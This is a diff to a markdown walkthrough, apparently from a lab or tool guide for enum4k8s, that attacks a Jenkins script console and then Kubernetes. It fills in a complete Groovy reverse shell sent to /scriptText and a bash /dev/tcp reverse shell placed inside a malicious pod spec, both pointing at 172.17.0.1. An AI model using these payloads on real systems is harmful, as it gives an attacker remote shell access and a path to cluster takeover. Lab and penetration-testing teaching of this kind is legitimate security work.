@@ -77,10 +77,7 @@ TODO: Sample Request to execute Groovy reverse shell
 POST / HTTP/1.1
 Host: https://jenkinssvc:8080/scriptText
 
-script=String host="<attack-machine-ip";
-int port=<listener-port>;
-String cmd="<command>";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+script=String host="172.17.0.1";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 Once the reverse shell connects to your listener we will need to get `enum4k8s` into the
@@ -161,7 +158,7 @@ ncat -lvp 6666
 In the reverse shell:
 
 ```
-./enum4k8s -pod -name "evil" -cmd '["bash", "-c", "bash -i >& /dev/tcp/<attack-machine-ip>/<port> 0>&1"]' -img "ubuntu:trusty" > pod.json
+./enum4k8s -pod -name "evil" -cmd '["bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/6666 0>&1"]' -img "ubuntu:trusty" > pod.json
 ```
 
 That should have generate a file with the following contents:
